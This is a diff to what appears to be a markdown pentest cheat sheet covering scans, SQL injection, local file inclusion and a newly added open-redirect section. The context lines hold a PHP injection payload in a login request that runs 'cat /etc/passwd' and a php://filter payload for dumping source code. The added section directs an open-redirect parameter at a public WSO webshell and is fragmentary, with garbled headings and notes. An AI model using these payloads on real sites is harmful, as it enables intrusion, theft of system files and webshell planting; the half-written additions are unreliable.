@@ -5,7 +5,7 @@
 - [automatic scan](#automatic).
 - [sql scan  ](#SqlScan )
 - [lfi](#lfi).
-
+- [open redirect](#openRedict)
 
 
 
@@ -464,3 +464,19 @@ login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
 ```
 php://filter/convert.base64-encode/resource=index.php
 ```
+#the end 
+
+
+
+### openRedict
+
+>shell  url =
+```
+url=https://github.com/mIcHyAmRaNe/wso-webshell/blob/master/wso.php
+```
+>shortlink to shell
+```
+shhortlink web scan
+```
+
+
